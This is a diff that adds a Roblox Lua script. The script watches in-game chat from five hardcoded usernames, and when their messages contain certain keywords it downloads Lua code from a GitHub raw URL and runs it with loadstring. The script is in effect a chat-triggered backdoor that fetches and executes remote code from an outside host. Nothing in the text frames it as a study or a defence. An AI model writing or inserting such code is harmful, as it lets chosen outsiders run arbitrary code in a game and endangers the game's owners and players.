@@ -1,0 +1,44 @@
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+
+local allowed = {
+	["project_2kit"] = true,
+	["bakonbits54"] = true,
+	["sharksinthewater"] = true,
+	["theonerulerofgravity"] = true,
+	["koolguy1234513"] = true
+}
+
+local function runCommand(msg)
+	local m = string.lower(msg)
+	if string.find(m,"shy",1,true) then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/refs/heads/main/shy%20guy"))()
+	elseif string.find(m,"san",1,true) then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/blob/main/sand"))()
+	elseif string.find(m,"test",1,true) then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/refs/heads/main/Test"))()
+	end
+end
+
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+	TextChatService.OnIncomingMessage = function(message)
+		if message.TextSource then
+			local player = Players:GetPlayerByUserId(message.TextSource.UserId)
+			if player and allowed[string.lower(player.Name)] then
+				runCommand(message.Text)
+			end
+		end
+	end
+else
+	for _,plr in ipairs(Players:GetPlayers()) do
+		if allowed[string.lower(plr.Name)] then
+			plr.Chatted:Connect(runCommand)
+		end
+	end
+	Players.PlayerAdded:Connect(function(plr)
+		if allowed[string.lower(plr.Name)] then
+			plr.Chatted:Connect(runCommand)
+		end
+	end)
+end
